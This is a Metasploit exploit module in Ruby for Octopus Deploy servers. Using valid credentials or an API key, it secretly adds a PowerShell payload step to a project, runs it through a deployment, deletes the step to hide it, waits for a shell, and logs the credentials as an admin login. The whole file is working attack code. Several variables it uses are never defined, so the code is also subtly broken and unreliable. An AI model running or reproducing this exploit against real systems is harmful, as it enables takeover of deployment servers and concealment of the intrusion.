# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/exploit/powershell&#039;
require &#039;json&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Octopus Deploy Authenticated Code Execution&#039;,
      &#039;Description&#039; => %q{
          This module can be used to execute a payload on an Octopus Deploy server given
          valid credentials or an API key. The payload is execued as a powershell script step
          on the Octopus Deploy server during a deployment.
      },
      &#039;License&#039;     => MSF_LICENSE,
      &#039;Author&#039;      => [ &#039;James Otten <jamesotten1[at]gmail.com>&#039; ],
      &#039;References&#039;  =>
        [
          # Octopus Deploy docs
          [ &#039;URL&#039;, &#039;https://octopus.com&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;WfsDelay&#039;    => 30,
          &#039;EXITFUNC&#039;    => &#039;process&#039;
        },
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Targets&#039;         =>
        [
          [ &#039;Windows Powershell&#039;, { &#039;Platform&#039; => [ &#039;windows&#039; ], &#039;Arch&#039; => [ ARCH_X86, ARCH_X64 ] } ]
        ],
      &#039;DefaultTarget&#039;   => 0,
      &#039;DisclosureDate&#039;  => &#039;May 15 2017&#039;
    ))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ false, &#039;The username to authenticate as&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;The password for the specified username&#039; ]),
        OptString.new(&#039;APIKEY&#039;, [ false, &#039;API key to use instead of username and password&#039;]),
        OptString.new(&#039;PATH&#039;, [ true, &#039;URI of the Octopus Deploy server. Default is /&#039;, &#039;/&#039;]),
        OptString.new(&#039;STEPNAME&#039;, [false, &#039;Name of the script step that will be temporarily added&#039;])
      ]
    )
  end

  def check
    res = nil
    if datastore[&#039;APIKEY&#039;]
      res = check_api_key
    elsif datastore[&#039;USERNAME&#039;] && datastore[&#039;PASSWORD&#039;]
      res = do_login
    else
      begin
        fail_with(Failure::BadConfig, &#039;Need username and password or API key&#039;)
      rescue Msf::Exploit::Failed => e
        vprint_error(e.message)
        return CheckCode::Unknown
      end
    end
    disconnect
    return CheckCode::Unknown if res.nil?
    if res.code.between?(400, 499)
      vprint_error("Server rejected the credentials")
      return CheckCode::Unknown
    end
    CheckCode::Appears
  end

  def exploit
    # Generate the powershell payload
    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true, use_single_quotes: true)
    step_name = datastore[&#039;STEPNAME&#039;] || rand_text_alphanumeric(4 + rand(32 - 4))
    session = create_octopus_session unless datastore[&#039;APIKEY&#039;]

    #
    # Get project steps
    #
    print_status("Getting available projects")
    project = get_project(session)
    project_id = project[&#039;Id&#039;]
    project_name = project[&#039;Name&#039;]
    print_status("Using project #{project_name}")

    print_status("Getting steps to #{project_name}")
    steps = get_steps(session, project_id)
    added_step = make_powershell_step(command, step_name)
    steps[&#039;Steps&#039;].insert(0, added_step)

    #
    # Add step
    #
    print_status("Adding step #{step_name} to #{project_name}")
    put_steps(session, project_id, modified_steps)

    #
    # Make release
    #
    print_status(&#039;Getting available channels&#039;)
    channels = get_channel(session, project_id)
    channel = channels[&#039;Items&#039;][0][&#039;Id&#039;]
    channel_name = channels[&#039;Items&#039;][0][&#039;Name&#039;]
    print_status("Using channel #{channel_name}")

    print_status(&#039;Getting next version&#039;)
    version = get_version(session, project_id, channel)
    print_status("Using version #{version}")

    release_params = {
      "ProjectId"        => project_id,
      "ChannelId"        => channel,
      "Version"          => version,
      "SelectedPackages" => []
    }
    print_status(&#039;Creating release&#039;)
    release_id = do_release(session, release_params_str)
    print_status("Release #{release_id} created")

    #
    # Deploy
    #
    dash = do_get_dashboard(session, project_id)

    environment = dash[&#039;Environments&#039;][0][&#039;Id&#039;]
    environment_name = dash[&#039;Environments&#039;][0][&#039;Name&#039;]
    skip_steps = do_get_skip_steps(session, release_id, environment, step_name)
    deployment_params = {
      &#039;ReleaseId&#039;            => release_id,
      &#039;EnvironmentId&#039;        => environment,
      &#039;SkipActions&#039;          => skip_steps,
      &#039;ForcePackageDownload&#039; => &#039;False&#039;,
      &#039;UseGuidedFailure&#039;     => &#039;False&#039;,
      &#039;FormValues&#039;           => {}
    }
    print_status("Deploying #{project_name} version #{version} to #{environment_name}")
    do_deployment(session, deployment_params_str)

    #
    # Delete step
    #
    print_status("Getting updated steps to #{project_name}")
    steps = get_steps(session, project_id)
    print_status("Deleting step #{step_name} from #{project_name}")
    steps[&#039;Steps&#039;].each do |item|
      steps[&#039;Steps&#039;].delete(item) if item[&#039;Name&#039;] == step_name
    end
    put_steps(session, project_id, modified_steps)
    print_status("Step #{step_name} deleted")

    #
    # Wait for shell
    #
    handler
  end

  def get_project(session)
    path = &#039;api/projects&#039;
    res = send_octopus_get_request(session, path, &#039;Get projects&#039;)
    body = parse_json_response(res)
    body[&#039;Items&#039;].each do |item|
      return item if item[&#039;IsDisabled&#039;] == false
    end
    fail_with(Failure::Unknown, &#039;No suitable projects found.&#039;)
  end

  def get_steps(session, project_id)
    path = "api/deploymentprocesses/deploymentprocess-#{project_id}"
    res = send_octopus_get_request(session, path, &#039;Get steps&#039;)
    body = parse_json_response(res)
    body
  end

  def put_steps(session, project_id, steps)
    path = "api/deploymentprocesses/deploymentprocess-#{project_id}"
    send_octopus_put_request(session, path, &#039;Put steps&#039;, steps)
  end

  def get_channel(session, project_id)
    path = "api/projects/#{project_id}/channels"
    res = send_octopus_get_request(session, path, &#039;Get channel&#039;)
    parse_json_response(res)
  end

  def get_version(session, project_id, channel)
    path = "api/deploymentprocesses/deploymentprocess-#{project_id}/template?channel=#{channel}"
    res = send_octopus_get_request(session, path, &#039;Get version&#039;)
    body = parse_json_response(res)
    body[&#039;NextVersionIncrement&#039;]
  end

  def do_get_skip_steps(session, release, environment, payload_step_name)
    res = send_octopus_get_request(session, path, &#039;Get skip steps&#039;)
    body = parse_json_response(res)
    skip_steps = []
    body[&#039;StepsToExecute&#039;].each do |item|
      if (!item[&#039;ActionName&#039;].eql? payload_step_name) && item[&#039;CanBeSkipped&#039;]
        skip_steps.push(item[&#039;ActionId&#039;])
      end
    end
    skip_steps
  end

  def do_release(session, params)
    path = &#039;api/releases&#039;
    res = send_octopus_post_request(session, path, &#039;Do release&#039;, params)
    body = parse_json_response(res)
    body[&#039;Id&#039;]
  end

  def do_get_dashboard(session, project_id)
    path = "api/dashboard/dynamic?includePrevious=true&projects=#{project_id}"
    res = send_octopus_get_request(session, path, &#039;Get dashboard&#039;)
    parse_json_response(res)
  end

  def do_deployment(session, params)
    path = &#039;api/deployments&#039;
    send_octopus_post_request(session, path, &#039;Do deployment&#039;, params)
  end

  def make_powershell_step(ps_payload, step_name)
    prop = {
      &#039;Octopus.Action.RunOnServer&#039; => &#039;true&#039;,
      &#039;Octopus.Action.Script.Syntax&#039; => &#039;PowerShell&#039;,
      &#039;Octopus.Action.Script.ScriptSource&#039; => &#039;Inline&#039;,
      &#039;Octopus.Action.Script.ScriptBody&#039; => ps_payload
    }
    step = {
      &#039;Name&#039; => step_name,
      &#039;Environments&#039; => [],
      &#039;Channels&#039; => [],
      &#039;TenantTags&#039; => [],
      &#039;Properties&#039; => { &#039;Octopus.Action.TargetRoles&#039; => &#039;&#039; },
      &#039;Condition&#039; => &#039;Always&#039;,
      &#039;StartTrigger&#039; => &#039;StartWithPrevious&#039;,
      &#039;Actions&#039; => [ { &#039;ActionType&#039; => &#039;Octopus.Script&#039;, &#039;Name&#039; => step_name, &#039;Properties&#039; => prop } ]
    }
    step
  end

  def send_octopus_get_request(session, path, nice_name = &#039;&#039;)
    request_path = normalize_uri(datastore[&#039;PATH&#039;], path)
    headers = create_request_headers(session)
    res = send_request_raw(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => request_path,
      &#039;headers&#039; => headers,
      &#039;SSL&#039; => ssl
    )
    check_result_status(res, request_path, nice_name)
    res
  end

  def send_octopus_post_request(session, path, nice_name, data)
    res = send_octopus_data_request(session, path, data, &#039;POST&#039;)
    check_result_status(res, path, nice_name)
    res
  end

  def send_octopus_put_request(session, path, nice_name, data)
    res = send_octopus_data_request(session, path, data, &#039;PUT&#039;)
    check_result_status(res, path, nice_name)
    res
  end

  def send_octopus_data_request(session, path, data, method)
    request_path = normalize_uri(datastore[&#039;PATH&#039;], path)
    headers = create_request_headers(session)
    headers[&#039;Content-Type&#039;] = &#039;application/json&#039;
    res = send_request_raw(
      &#039;method&#039; => method,
      &#039;uri&#039; => request_path,
      &#039;headers&#039; => headers,
      &#039;data&#039; => data,
      &#039;SSL&#039; => ssl
    )
    res
  end

  def check_result_status(res, request_path, nice_name)
    if !res || res.code < 200 || res.code >= 300
      req_name = nice_name || &#039;Request&#039;
      fail_with(Failure::UnexpectedReply, "#{req_name} failed #{request_path} [#{res.code} #{res.message}]")
    end
  end

  def create_request_headers(session)
    headers = {}
    if session.blank?
      headers[&#039;X-Octopus-ApiKey&#039;] = datastore[&#039;APIKEY&#039;]
    else
      headers[&#039;Cookie&#039;] = session
      headers[&#039;X-Octopus-Csrf-Token&#039;] = get_csrf_token(session, &#039;Octopus-Csrf-Token&#039;)
    end
    headers
  end

  def get_csrf_token(session, csrf_cookie)
    key_vals = session.scan(/\s?([^, ;]+?)=([^, ;]*?)[;,]/)
    key_vals.each do |name, value|
      return value if name.starts_with?(csrf_cookie)
    end
    fail_with(Failure::Unknown, &#039;CSRF token not found&#039;)
  end

  def parse_json_response(res)
    begin
      json = JSON.parse(res.body)
      return json
    rescue JSON::ParserError
      fail_with(Failure::Unknown, &#039;Failed to parse response json&#039;)
    end
  end

  def create_octopus_session
    res = do_login
    if res && res.code == 404
      fail_with(Failure::BadConfig, &#039;Incorrect path&#039;)
    elsif !res || (res.code != 200)
      fail_with(Failure::NoAccess, &#039;Could not initiate session&#039;)
    end
    res.get_cookies
  end

  def do_login
    path = normalize_uri(datastore[&#039;PATH&#039;], &#039;/api/users/login&#039;)
    res = send_request_raw(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => path,
      &#039;ctype&#039; => &#039;application/json&#039;,
      &#039;data&#039; => json_post_data,
      &#039;SSL&#039; => ssl
    )

    if !res || (res.code != 200)
      print_error("Login failed")
    elsif res.code == 200
      report_octopusdeploy_credential
    end

    res
  end

  def check_api_key
    headers = {}
    headers[&#039;X-Octopus-ApiKey&#039;] = datastore[&#039;APIKEY&#039;] || &#039;&#039;
    path = normalize_uri(datastore[&#039;PATH&#039;], &#039;/api/serverstatus&#039;)
    res = send_request_raw(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => path,
      &#039;headers&#039; => headers,
      &#039;SSL&#039; => ssl
    )

    print_error("Login failed") if !res || (res.code != 200)

    vprint_status(res.body)

    res
  end

  def report_octopusdeploy_credential
    service_data = {
      address: ::Rex::Socket.getaddress(datastore[&#039;RHOST&#039;], true),
      port: datastore[&#039;RPORT&#039;],
      service_name: (ssl ? "https" : "http"),
      protocol: &#039;tcp&#039;,
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      private_type: :password,
      private_data: datastore[&#039;PASSWORD&#039;].downcase,
      username: datastore[&#039;USERNAME&#039;]
    }

    credential_data.merge!(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      access_level: &#039;Admin&#039;,
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL
    }
    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end

